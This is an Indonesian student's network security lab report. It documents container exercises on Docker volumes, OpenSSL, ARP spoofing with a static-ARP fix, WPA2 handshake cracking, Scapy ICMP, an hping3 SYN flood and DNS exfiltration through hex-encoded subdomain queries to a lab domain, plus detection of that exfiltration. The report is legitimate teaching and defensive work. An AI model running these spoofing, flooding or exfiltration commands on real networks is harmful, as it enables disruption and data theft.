/># LAPORAN UTS NETWORK SECURITY
## Kasus 8 (K8) — Dokumentasi Tugas 1–7

**Nama:** Revin Erdiansyah
**NIM:** 24552011387
**Program Studi:** Teknik Informatika
**Kelas:** TIF RP 24E CNS
**Mata Kuliah:** Network Security

---

# Parameter Praktikum

| Parameter | Nilai |
|---|---|
| Container target | `target-k8` |
| Volume | `vol-k8` |
| File | `laporan-k8.txt` |
| Domain DNS | `k8.exfil.lab` |
| Penentuan kasus | Jumlah digit NIM 38, 38 mod 10 = 8, sehingga Kasus 8 |

**Catatan:** Seluruh pengujian dilakukan pada lingkungan lab praktikum. NIM yang digunakan dalam pengujian adalah `24552011387`. Hasil dan analisis ditulis berdasarkan keluaran terminal pada screenshot; bagian yang tidak terbukti dinyatakan apa adanya.

---

# TUGAS 1 — DOCKER DAN VOLUME
## Pertemuan 1

### 1. Tujuan

Membuktikan bahwa data pada Docker Volume tetap ada walaupun container yang menulisnya sudah dihapus, serta menjalankan dua container (attacker dan target) dengan Docker Compose yang saling berkomunikasi lewat jaringan internal.

### 2. Perintah dan penjelasan

```bash
docker volume create vol-k8
docker run --name w-k8 -v vol-k8:/data alpine sh -c 'echo 24552011387 > /data/laporan-k8.txt'
docker rm w-k8
docker run --rm -v vol-k8:/data alpine cat /data/laporan-k8.txt
docker compose -p k8 -f 01-sumber-lab/b/b1-compose/docker-compose.yml up -d
docker compose -p k8 -f 01-sumber-lab/b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k8 -f 01-sumber-lab/b/b1-compose/docker-compose.yml down -v
```

- `docker volume create vol-k8` membuat volume bernama `vol-k8` sebagai penyimpanan yang terpisah dari siklus hidup container.
- `docker run --name w-k8 -v vol-k8:/data alpine sh -c 'echo ... > /data/laporan-k8.txt'` menjalankan container Alpine, memasang volume ke `/data`, lalu menulis NIM ke `laporan-k8.txt`.
- `docker rm w-k8` menghapus container penulis. Yang dihapus hanya container-nya, bukan volume.
- `docker run --rm -v vol-k8:/data alpine cat /data/laporan-k8.txt` memakai container baru untuk membaca file yang sama dari volume.
- `docker compose ... up -d` menjalankan container `attacker` dan `target` pada jaringan `k8_lab`.
- `exec attacker wget -qO- http://target` mengambil halaman web target dari container attacker memakai nama layanan `target`.
- `docker compose ... down -v` menghentikan dan menghapus container, jaringan, serta volume yang dibuat Compose.

### 3. Bukti Praktikum

**Screenshot 1:** Pembuatan volume `vol-k8`.

![Bukti Tugas 1 - 01](tugas-1/screenshot/01.png)

**Screenshot 2:** Container `w-k8` menulis NIM ke `/data/laporan-k8.txt` pada volume.

![Bukti Tugas 1 - 02](tugas-1/screenshot/02.png)

**Screenshot 3:** Container penulis `w-k8` dihapus.

![Bukti Tugas 1 - 03](tugas-1/screenshot/03.png)

**Screenshot 4:** Container baru membaca file dari volume dan menampilkan NIM `24552011387`.

![Bukti Tugas 1 - 04](tugas-1/screenshot/04.png)

**Screenshot 5:** Docker Compose membuat jaringan `k8_lab` serta container `k8-attacker-1` dan `k8-target-1`.

![Bukti Tugas 1 - 05](tugas-1/screenshot/05.png)

**Screenshot 6:** Container attacker berhasil mengambil halaman `Welcome to nginx!` dari target.

![Bukti Tugas 1 - 06](tugas-1/screenshot/06.png)

**Screenshot 7:** Compose `down -v` menghapus kedua container dan jaringan.

![Bukti Tugas 1 - 07](tugas-1/screenshot/07.png)

### 4. Hasil Pengujian

1. Volume `vol-k8` berhasil dibuat dan file `laporan-k8.txt` berhasil ditulis.
2. Setelah container `w-k8` dihapus, container baru tetap bisa membaca isi file dan menampilkan `24552011387`. Data bertahan karena tersimpan di volume.
3. Docker Compose membuat jaringan `k8_lab` dan dua container (`k8-attacker-1`, `k8-target-1`) dalam status Started.
4. Container attacker berhasil mengakses `http://target` dan menerima halaman default Nginx, sehingga komunikasi antarcontainer berjalan.
5. Perintah `down -v` menghapus kedua container dan jaringan `k8_lab`.

### 5. Kesimpulan

Docker Volume memisahkan penyimpanan data dari container sehingga data tetap ada setelah container dihapus. Docker Compose memudahkan pengelolaan beberapa container sekaligus dan memungkinkan komunikasi antarcontainer lewat nama layanan.

---

# TUGAS 2 — KRIPTOGRAFI
## Pertemuan 2

### 1. Tujuan

Menguji hash SHA-256, enkripsi dan dekripsi AES-256-CBC, serta pemeriksaan sertifikat digital self-signed menggunakan OpenSSL.

### 2. Perintah dan penjelasan

```bash
docker run --rm -v "$PWD/01-sumber-lab":/work -w /work uts-kali-tools sh -c 'echo "isi laporan k8" > laporan-k8.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k8.txt -out laporan-k8.enc -pass pass:kunci-k8-2026 && sha256sum laporan-k8.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k8.enc -out hasil-k8.txt -pass pass:kunci-k8-2026 && sha256sum hasil-k8.txt'

docker run --rm -v "$PWD/01-sumber-lab":/work -w /work uts-kali-tools openssl x509 -in cert-k8.pem -noout -subject -issuer -dates
```

- `openssl enc -aes-256-cbc -pbkdf2 -salt` mengenkripsi `laporan-k8.txt` menjadi `laporan-k8.enc` dengan AES-256 mode CBC, derivasi kunci PBKDF2, dan salt acak.
- `sha256sum laporan-k8.txt` menghitung hash file asli sebagai sidik jari integritas.
- `openssl enc -d ...` mendekripsi `laporan-k8.enc` menjadi `hasil-k8.txt`, lalu `sha256sum hasil-k8.txt` dihitung untuk dibandingkan.
- `openssl x509 -in cert-k8.pem -noout -subject -issuer -dates` memeriksa sertifikat self-signed `cert-k8.pem` (CN `k8.exfil.lab`) dan menampilkan Subject, Issuer, serta masa berlaku 30 hari.

### 3. Bukti Praktikum

**Screenshot 1:** Enkripsi, dekripsi, dan dua hash SHA-256 (hasilnya identik).

![Bukti Tugas 2 - 01](tugas-2/screenshot/01.png)


**Screenshot 2:** Pemeriksaan sertifikat `cert-k8.pem`: Subject, Issuer, serta masa berlaku.

![Bukti Tugas 2 - 02](tugas-2/screenshot/02.png)


### 4. Hasil Pengujian

1. **Hash SHA-256.** Hash file asli `laporan-k8.txt` dan file hasil dekripsi `hasil-k8.txt` bernilai sama, yaitu `e26ef77c5ac16543d232d3bd3c0663aaa8550290b217a8a6925671d37a4264f7` (Screenshot 1). Isi file kembali utuh setelah dienkripsi dengan AES-256-CBC lalu didekripsi.
2. **Sertifikat digital.** Pemeriksaan `cert-k8.pem` menunjukkan `subject=CN=k8.exfil.lab` dan `issuer=CN=k8.exfil.lab` (Screenshot 2). Subject dan Issuer sama karena sertifikat ditandatangani sendiri (self-signed), tanpa Certificate Authority (CA).
3. **Masa berlaku.** `notBefore=Nov 25 00:56:39 2026 GMT` dan `notAfter=Dec 25 00:56:39 2026 GMT`, sehingga sertifikat berlaku 30 hari.

### 5. Kesimpulan

AES-256-CBC berhasil menjaga kerahasiaan data, dan kesamaan dua hash SHA-256 membuktikan integritas file tetap terjaga setelah enkripsi dan dekripsi. Sertifikat self-signed dengan CN `k8.exfil.lab` berhasil dibuat dan valid selama 30 hari. Sertifikat jenis ini cukup untuk lab, tetapi tidak otomatis dipercaya publik karena tidak diterbitkan oleh CA.

---

# TUGAS 3 — ARP SPOOFING
## Pertemuan 3

### 1. Tujuan

Menjalankan ARP spoofing pada jaringan Docker terisolasi, mengamati tabel ARP korban, lalu menerapkan mitigasi berupa static ARP.

### 2. Perintah dan penjelasan

```bash
docker network create lab-arp-k8
docker run -d --name korban-k8 --network lab-arp-k8 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k8 --network lab-arp-k8 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k8 --network lab-arp-k8 --cap-add NET_ADMIN uts-kali-tools
docker inspect -f '{{.Name}} {{range .NetworkSettings.Networks}}{{.IPAddress}} {{.MacAddress}}{{end}}' korban-k8 gateway-k8 penyerang-k8
docker exec korban-k8 cat /proc/net/arp
watch -n 0.5 docker exec korban-k8 cat /proc/net/arp
docker exec penyerang-k8 timeout 20 arpspoof -i eth0 -t 172.20.0.2 172.20.0.3
docker inspect -f '{{.State.Pid}}' korban-k8
nsenter -t <PID> -n ip neigh replace 172.20.0.3 lladdr 42:a1:a8:2a:4a:a6 nud permanent dev eth0
nsenter -t <PID> -n ip neigh show 172.20.0.3
docker exec korban-k8 cat /proc/net/arp
```

- `docker network create lab-arp-k8` membuat jaringan bridge khusus untuk pengujian.
- Tiga container (`korban-k8`, `gateway-k8`, `penyerang-k8`) dibuat dari image `uts-kali-tools` dengan kemampuan `NET_ADMIN` agar bisa mengubah konfigurasi jaringan.
- `docker inspect -f ...` menampilkan alamat IP masing-masing container.
- `cat /proc/net/arp` pada korban menampilkan tabel ARP, yaitu pemetaan IP ke alamat MAC beserta flag-nya; `watch` memantau tabel tersebut tiap 0,5 detik selama serangan.
- `arpspoof -i eth0 -t 172.20.0.2 172.20.0.3` mengirim balasan ARP palsu ke korban yang menyatakan IP gateway berada pada MAC penyerang.
- `nsenter -t <PID> -n ip neigh replace ... nud permanent` membuat entri ARP statis (`PERMANENT`) untuk gateway `172.20.0.3` di network namespace korban, agar tidak bisa ditimpa balasan ARP palsu. Cara ini dipakai karena perintah `arp` tidak tersedia di container; `<PID>` diambil dari `docker inspect -f '{{.State.Pid}}' korban-k8`.

### 3. Bukti Praktikum

**Screenshot 1:** Pembuatan jaringan `lab-arp-k8`.

![Bukti Tugas 3 - 01](tugas-3/screenshot/01.png)

**Screenshot 2:** Container `korban-k8` berjalan.

![Bukti Tugas 3 - 02](tugas-3/screenshot/02.png)

**Screenshot 3:** Container `gateway-k8` berjalan.

![Bukti Tugas 3 - 03](tugas-3/screenshot/03.png)

**Screenshot 4:** Container `penyerang-k8` berjalan.

![Bukti Tugas 3 - 04](tugas-3/screenshot/04.png)

**Screenshot 5:** Alamat IP dan MAC ketiga container: korban `172.20.0.2`, gateway `172.20.0.3`, penyerang `172.20.0.4`.

![Bukti Tugas 3 - 05](tugas-3/screenshot/05.png)

**Screenshot 6:** Tabel ARP korban (`/proc/net/arp`) sebelum serangan.

![Bukti Tugas 3 - 06](tugas-3/screenshot/06.png)

**Screenshot 7:** Pemeriksaan ulang IP gateway, penyerang, dan korban satu per satu.

![Bukti Tugas 3 - 07](tugas-3/screenshot/07.png)

**Screenshot 8:** `arpspoof` dijalankan dari penyerang menuju korban selama 20 detik: balasan ARP palsu terkirim, lalu `Cleaning up and re-arping targets`.

![Bukti Tugas 3 - 08](tugas-3/screenshot/08.png)

**Screenshot 9:** Tabel ARP korban (dipantau dengan `watch`) saat `arpspoof` berjalan.

![Bukti Tugas 3 - 09](tugas-3/screenshot/09.png)

**Screenshot 10:** Pemasangan entri ARP statis untuk gateway `172.20.0.3` di korban memakai `nsenter` dan `ip neigh replace`.

![Bukti Tugas 3 - 10](tugas-3/screenshot/10.png)

**Screenshot 11:** Entri ARP gateway berstatus `PERMANENT` dan tabel ARP korban setelah mitigasi.

![Bukti Tugas 3 - 11](tugas-3/screenshot/11.png)

### 4. Hasil Pengujian

1. **Topologi.** Ketiga container berada pada jaringan `lab-arp-k8`: korban `172.20.0.2` (MAC `9a:ca:63:9b:ac:6a`), gateway `172.20.0.3` (MAC `42:a1:a8:2a:4a:a6`), dan penyerang `172.20.0.4` (MAC `ca:f0:df:31:f6:ad`) (Screenshot 5).
2. **Sebelum serangan.** Tabel ARP korban memuat `172.20.0.3` dengan MAC asli gateway `42:a1:a8:2a:4a:a6` (Screenshot 6).
3. **Serangan.** `arpspoof` mengirim balasan ARP palsu berulang ke korban: `172.20.0.3 is-at ca:f0:df:31:f6:ad`, yaitu MAC penyerang diklaim sebagai gateway. Setelah 20 detik `arpspoof` menampilkan `Cleaning up and re-arping targets` dan memulihkan dengan `172.20.0.3 is-at 42:a1:a8:2a:4a:a6` (Screenshot 8).
4. **Tabel ARP saat serangan.** Entri `172.20.0.3` pada tabel korban tetap `42:a1:a8:2a:4a:a6` dengan `Flags 0x6` (Screenshot 9). Flag `0x6` berarti entri lengkap dan permanen, sedangkan entri `172.20.0.4` berflag `0x2` (dinamis). Karena `0x6` sudah terlihat sejak Screenshot 6, perubahan MAC sebelum dan sesudah serangan tidak terlihat pada tabel. Bukti keberhasilan pengiriman serangan bertumpu pada keluaran `arpspoof` (Screenshot 8).
5. **Mitigasi.** Perintah `arp` tidak tersedia di dalam container, sehingga entri statis dibuat dari host melalui `nsenter` dan `ip neigh replace` untuk IP gateway yang benar, `172.20.0.3`, dengan MAC `42:a1:a8:2a:4a:a6` (Screenshot 10). `ip neigh show 172.20.0.3` menampilkan status `PERMANENT`, dan tabel ARP korban tetap memuat MAC asli gateway (Screenshot 11).

### 5. Kesimpulan

ARP tidak memiliki autentikasi, sehingga balasan ARP palsu dapat dikirim dengan mudah. Hal ini terbukti dari keluaran `arpspoof` yang terus mengklaim `172.20.0.3` berada pada MAC penyerang. Entri ARP statis (`PERMANENT`) untuk gateway adalah mitigasi sederhana yang efektif, karena entri tersebut tidak ditimpa oleh balasan ARP baru dan tabel korban tetap memuat MAC asli gateway. Keterbatasan: tabel ARP korban sudah berflag permanen (`0x6`) pada seluruh pengamatan, sehingga perubahan MAC akibat serangan tidak terekam sebelum mitigasi dipasang.

---

# TUGAS 4 — ANALISIS HANDSHAKE WPA2
## Pertemuan 4

### 1. Tujuan

Menganalisis file capture handshake WPA2 dengan aircrack-ng menggunakan wordlist yang disediakan, serta memahami empat langkah four-way handshake.

### 2. Perintah dan penjelasan

```bash
docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k8.txt handshake-k8.cap
```

- `-v "$PWD":/work` memasang folder kerja (berisi `wordlist-k8.txt` dan `handshake-k8.cap`) ke dalam container.
- `aircrack-ng -w wordlist-k8.txt handshake-k8.cap` membaca file capture dan mencoba setiap kata sandi di wordlist terhadap handshake yang ditemukan.

### 3. Penjelasan Four-Way Handshake

Four-way handshake membuktikan bahwa client dan access point (AP) sama-sama mengetahui PSK tanpa mengirim PSK itu sendiri.

1. **Message 1 (AP ke client):** AP mengirim ANonce (angka acak dari AP).
2. **Message 2 (client ke AP):** Client mengirim SNonce, lalu menurunkan PTK dari PSK, ANonce, SNonce, dan alamat MAC kedua pihak. Pesan ini disertai MIC.
3. **Message 3 (AP ke client):** AP menurunkan PTK yang sama, memverifikasi MIC, lalu mengirim GTK yang terenkripsi beserta MIC.
4. **Message 4 (client ke AP):** Client mengonfirmasi bahwa kunci sudah terpasang.

Penyerang yang menangkap handshake dapat mencoba menebak PSK secara offline dengan menurunkan PTK dari setiap kandidat kata sandi dan mencocokkan MIC. Karena itu kata sandi yang panjang dan acak sangat penting.

### 4. Bukti Praktikum

**Screenshot 1:** Keluaran `aircrack-ng` pada file `handshake-k8.cap`.

![Bukti Tugas 4 - 01](tugas-4/screenshot/01.png)

### 5. Hasil Pengujian

1. `aircrack-ng` menampilkan `This file is not a regular 802.11 (wireless) capture`, `Read 0 packets`, dan `No networks found, exiting`.
2. Karena tidak ada jaringan atau handshake yang terbaca dari file tersebut, tidak ada tahap pencocokan kata sandi yang dijalankan. Pesan `KEY FOUND` maupun `KEY NOT FOUND` tidak muncul.
3. Dengan demikian, kata sandi WPA2 **tidak** berhasil ditemukan pada bukti ini, dan hasil tersebut tidak dapat dianggap sebagai kegagalan wordlist karena file capture memang tidak terbaca sebagai capture 802.11.

### 6. Kesimpulan

Perintah `aircrack-ng` berjalan, tetapi file `handshake-k8.cap` yang digunakan tidak terbaca sebagai capture 802.11 sehingga tidak ada handshake yang dapat dianalisis. Praktikum ini tetap menunjukkan syarat analisis handshake: file capture harus berisi paket WPA yang valid. Penjelasan four-way handshake di atas melengkapi pemahaman konsepnya.

---

# TUGAS 5 — ICMP DENGAN SCAPY
## Pertemuan 5

### 1. Tujuan

Mengirim paket ICMP echo request memakai Scapy ke container korban lalu membaca TTL dan tipe ICMP pada balasan.

### 2. Perintah dan penjelasan

```bash
docker run --rm --network lab-arp-k8 -v "$PWD/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py 172.20.0.2
```

- `--network lab-arp-k8` menghubungkan container sementara ke jaringan yang sama dengan korban.
- `-v "$PWD/kasus/k5-scapy:/work"` memasang folder skrip `kirim_icmp.py` ke dalam container.
- Skrip membuat paket `IP(dst=target)/ICMP()` lalu mengirimnya dengan `sr1()` dan membaca balasan pertama.
- Argumen `172.20.0.2` adalah IP `korban-k8` dari Tugas 3.

### 3. Penjelasan Smurf Attack

Smurf attack adalah serangan DDoS yang memanfaatkan ICMP echo request ke alamat broadcast dengan IP sumber dipalsukan sebagai alamat korban. Semua host pada jaringan broadcast tersebut membalas ke korban sehingga trafik ICMP berlipat dan korban kewalahan. Pencegahan yang umum: menonaktifkan balasan terhadap broadcast ICMP pada router dan host, serta menerapkan filter anti-spoofing.

### 4. Bukti Praktikum

**Screenshot 1:** Keluaran skrip Scapy: paket yang dikirim, TTL balasan, dan tipe ICMP balasan.

![Bukti Tugas 5 - 01](tugas-5/screenshot/01.png)

### 5. Hasil Pengujian

1. Paket yang dikirim: `IP / ICMP 172.20.0.5 > 172.20.0.2 echo-request 0`. Alamat sumber `172.20.0.5` adalah IP container sementara yang menjalankan skrip.
2. TTL balasan: `64`. Nilai ini umum untuk sistem Linux, yang mengindikasikan korban adalah host Linux yang berjarak satu lompatan.
3. Tipe ICMP balasan: `0`, yaitu **echo reply**. Ini berarti korban aktif dan merespons ping.

### 6. Kesimpulan

Scapy memungkinkan pembuatan dan pengiriman paket ICMP secara terprogram. Balasan bertipe 0 dengan TTL 64 membuktikan host target aktif. Mekanisme balasan ICMP inilah yang disalahgunakan pada smurf attack.

---

# TUGAS 6 — SYN FLOOD DAN THREE-WAY HANDSHAKE
## Pertemuan 6

### 1. Tujuan

Mengamati jumlah koneksi `SYN_RECV` pada target sebelum dan saat SYN flood dengan hping3, serta menangkap three-way handshake TCP normal dengan tcpdump.

### 2. Perintah dan penjelasan

```bash
docker compose -p k8-syn -f b/b3-syn-flood/docker-compose.yml up -d
docker compose -p k8-syn -f b/b3-syn-flood/docker-compose.yml exec target cat /proc/sys/net/ipv4/tcp_syncookies
docker compose -p k8-syn -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k8-syn -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose -p k8-syn -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
docker compose -p k8-syn -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
docker compose -p k8-syn -f b/b3-syn-flood/docker-compose.yml down -v
```

- `up -d` menjalankan container `attacker` dan `target` dari konfigurasi SYN flood.
- `cat /proc/sys/net/ipv4/tcp_syncookies` memeriksa apakah SYN cookies aktif (`1`) atau nonaktif (`0`).
- `netstat -ant | grep -c SYN_RECV` menghitung koneksi setengah terbuka (SYN diterima, ACK belum datang) pada target.
- `hping3 -S -p 80 --flood target` membanjiri port 80 target dengan paket SYN selama 15 detik (`timeout 15`), dijalankan di latar belakang (`exec -d`).
- `tcpdump -i eth0 -nn tcp port 80` menangkap paket TCP port 80 sementara `curl` melakukan satu koneksi normal.
- `down -v` membersihkan seluruh lingkungan.

### 3. Penjelasan TCP Three-Way Handshake

1. **SYN:** client mengirim paket dengan flag SYN untuk meminta koneksi.
2. **SYN-ACK:** server membalas dengan SYN dan ACK, lalu menyimpan koneksi pada status `SYN_RECV`.
3. **ACK:** client membalas ACK sehingga koneksi menjadi `ESTABLISHED`.

SYN flood mengirim banyak SYN (biasanya tanpa pernah mengirim ACK terakhir) agar tabel koneksi server dipenuhi entri `SYN_RECV` sampai koneksi sah tidak bisa dilayani.

### 4. Bukti Praktikum

**Screenshot 1:** Container `k8-attacker-1` dan `k8-target-1` berjalan.

![Bukti Tugas 6 - 01](tugas-6/screenshot/01.png)

**Screenshot 2:** Nilai `tcp_syncookies` dan jumlah `SYN_RECV` pada target sebelum serangan.

![Bukti Tugas 6 - 02](tugas-6/screenshot/02.png)


**Screenshot 3:** Perintah `hping3 -S -p 80 --flood target` dijalankan dari attacker.

![Bukti Tugas 6 - 03](tugas-6/screenshot/03.png)

**Screenshot 4:** Jumlah `SYN_RECV` pada target setelah serangan dimulai (dua kali pembacaan).

![Bukti Tugas 6 - 04](tugas-6/screenshot/04.png)

**Screenshot 5:** Hasil `tcpdump`: SYN, SYN-ACK, ACK, lalu permintaan HTTP.

![Bukti Tugas 6 - 05](tugas-6/screenshot/05.png)

**Screenshot 6:** Pembersihan lingkungan dengan `down -v`.

![Bukti Tugas 6 - 06](tugas-6/screenshot/06.png)

### 5. Hasil Pengujian

1. **Kondisi awal.** `tcp_syncookies` bernilai `0` (SYN cookies nonaktif) dan jumlah `SYN_RECV` pada target `0` (Screenshot 2).
2. **Saat SYN flood.** Setelah `hping3 -S -p 80 --flood target` dijalankan, jumlah `SYN_RECV` pada target naik menjadi `44`, lalu `49` pada pembacaan berikutnya (Screenshot 4). Koneksi setengah terbuka menumpuk karena ACK terakhir tidak pernah dikirim.
3. **Handshake normal.** `tcpdump` menangkap koneksi normal dari `172.21.0.3.45036` ke `172.21.0.2.80`: `Flags [S]` (SYN), `Flags [S.]` (SYN-ACK), dan `Flags [.]` (ACK), diikuti `GET / HTTP/1.1` dan balasan `HTTP/1.1 200 OK` (Screenshot 5).
4. **Batasan.** Pengujian ini tidak menyertakan percobaan koneksi sah saat serangan berlangsung, sehingga layanan menjadi tidak dapat diakses belum dibuktikan.

### 6. Kesimpulan

SYN flood terbukti membuat koneksi setengah terbuka menumpuk pada target, dari `0` menjadi `44` dan `49` entri `SYN_RECV`, dengan SYN cookies dalam keadaan nonaktif. Three-way handshake pada koneksi normal terbukti lengkap (SYN, SYN-ACK, ACK) dan menghasilkan respons HTTP 200. Namun, penuhnya antrean koneksi dan gangguan layanan belum dibuktikan secara langsung. Mitigasi yang relevan antara lain mengaktifkan SYN cookies, memperbesar atau membatasi antrean SYN, dan rate limiting.

---

# TUGAS 7 — DNS EXFILTRATION
## Pertemuan 7

### 1. Tujuan

Mensimulasikan pencurian data lewat query DNS (data dikodekan hex di label subdomain), lalu mendeteksinya dari log DNS dan mendekode kembali.

### 2. Perintah dan penjelasan

```bash
docker compose -p k8 -f b/b4-dns-exfil/docker-compose.yml up -d
echo -n 24552011387 | xxd -p
docker compose -p k8 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131333837.k8.exfil.lab @dns
docker compose -p k8 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k8.log
python3 kasus/k8-dns-exfil/analisis_dns.py dns-k8.log
echo 3234353532303131333837 | xxd -r -p
docker compose -p k8 -f b/b4-dns-exfil/docker-compose.yml down -v
```

- `up -d` menjalankan server DNS (dnsmasq) dan container attacker pada jaringan `k8_lab`.
- `echo -n 24552011387 | xxd -p` mengubah NIM menjadi hex: `3234353532303131333837`.
- `dig +short <hex>.k8.exfil.lab @dns` mengirim query DNS dengan data sebagai label subdomain ke server DNS lab.
- `logs dns > dns-k8.log` menyimpan log server DNS ke file.
- `analisis_dns.py` menghitung query per domain induk, menandai query dengan label berisi hex, dan mendekode labelnya.
- `xxd -r -p` mendekode hex kembali menjadi teks asli.

### 3. Bukti Praktikum

**Screenshot 1:** Lingkungan DNS exfiltration dijalankan (jaringan `k8_lab`, `k8-dns-1`, `k8-attacker-1`).

![Bukti Tugas 7 - 01](tugas-7/screenshot/01.png)

**Screenshot 2:** Dekode hex `3234353532303131333837` kembali menjadi NIM dengan `xxd -r -p`.

![Bukti Tugas 7 - 02](tugas-7/screenshot/02.png)

**Screenshot 3:** Query `dig` dengan label hex dijawab server DNS dengan `10.0.0.99`.

![Bukti Tugas 7 - 03](tugas-7/screenshot/03.png)

**Screenshot 4:** Log DNS disimpan ke `dns-k8.log`.

![Bukti Tugas 7 - 04](tugas-7/screenshot/04.png)

**Screenshot 5:** Keluaran `analisis_dns.py`: jumlah query per domain induk, query mencurigakan, dan hasil decode.

![Bukti Tugas 7 - 05](tugas-7/screenshot/05.png)

**Screenshot 6:** Pembersihan lingkungan dengan `down -v`.

![Bukti Tugas 7 - 06](tugas-7/screenshot/06.png)

### 4. Hasil Pengujian

1. **Enkode.** NIM `24552011387` diubah menjadi hex `3234353532303131333837` dan dikirim sebagai label subdomain pada query `3234353532303131333837.k8.exfil.lab`, yang dijawab server DNS dengan `10.0.0.99` (Screenshot 3).
2. **Log.** Log server DNS berhasil disimpan ke `dns-k8.log` (Screenshot 4).
3. **Deteksi.** `analisis_dns.py` melaporkan `exfil.lab: 1` pada jumlah query per domain induk, lalu menandai query mencurigakan dengan `panjang=22` pada domain `3234353532303131333837.k8.exfil.lab` (Screenshot 5).
4. **Dekode.** Hasil decode pada keluaran skrip adalah `24552011387` (Screenshot 5). Perintah `echo 3234353532303131333837 | xxd -r -p` juga menghasilkan `24552011387`, sama dengan NIM asli (Screenshot 2).

### 5. Kesimpulan

Data dapat diselundupkan lewat label subdomain pada query DNS dan tetap sampai ke server DNS penyerang. Pada praktikum ini, pencurian data tersebut berhasil dideteksi dari log DNS melalui label panjang berisi karakter hex pada domain `k8.exfil.lab`, dan isinya berhasil didekode kembali menjadi NIM `24552011387`. Deteksi dapat dilakukan dengan memeriksa panjang label, pola hex, dan jumlah query per domain induk.

---

## Catatan kecocokan bukti

Seluruh screenshot disertakan melalui tautan relatif pada setiap bagian tugas. Beberapa hasil ditulis terbatas sesuai bukti:

- **Tugas 3:** pengiriman balasan ARP palsu terbukti dari keluaran `arpspoof`, tetapi entri `172.20.0.3` pada tabel korban sudah berflag permanen (`0x6`) sejak sebelum serangan, sehingga perubahan MAC pada tabel tidak terlihat. Mitigasi static ARP dipasang untuk IP yang benar (`172.20.0.3`) dan berstatus `PERMANENT`.
- **Tugas 4:** file capture tidak terbaca sebagai capture 802.11 sehingga tidak ada handshake yang dianalisis.
- **Tugas 6:** `SYN_RECV` naik dari `0` menjadi `44` dan `49` saat SYN flood, tetapi gangguan layanan (koneksi sah ditolak) tidak diuji secara langsung.
- **Tugas 7:** deteksi query mencurigakan dan hasil decode `24552011387` terbukti pada keluaran `analisis_dns.py` dan `xxd -r -p`.

---

# KESIMPULAN AKHIR

Praktikum Kasus 8 mencakup tujuh materi keamanan jaringan: Docker dan Volume, Kriptografi, ARP Spoofing, Analisis Handshake WPA2, ICMP dengan Scapy, SYN Flood, dan DNS Exfiltration.

Bukti yang paling kuat terdapat pada Tugas 1 (data volume bertahan setelah container dihapus), Tugas 2 (dua hash SHA-256 identik dan sertifikat self-signed CN=k8.exfil.lab berlaku 30 hari), Tugas 5 (echo reply bertipe 0 dengan TTL 64), Tugas 6 (SYN_RECV naik hingga 49 saat SYN flood dan handshake TCP normal lengkap), serta Tugas 7 (query DNS berlabel hex terdeteksi dan terdecode menjadi NIM). Pada Tugas 3, serangan ARP spoofing terbukti terkirim dan mitigasi static ARP berhasil dipasang, dengan keterbatasan pada perubahan tabel ARP korban. Tugas 4 memiliki keterbatasan bukti sebagaimana dicatat di atas.
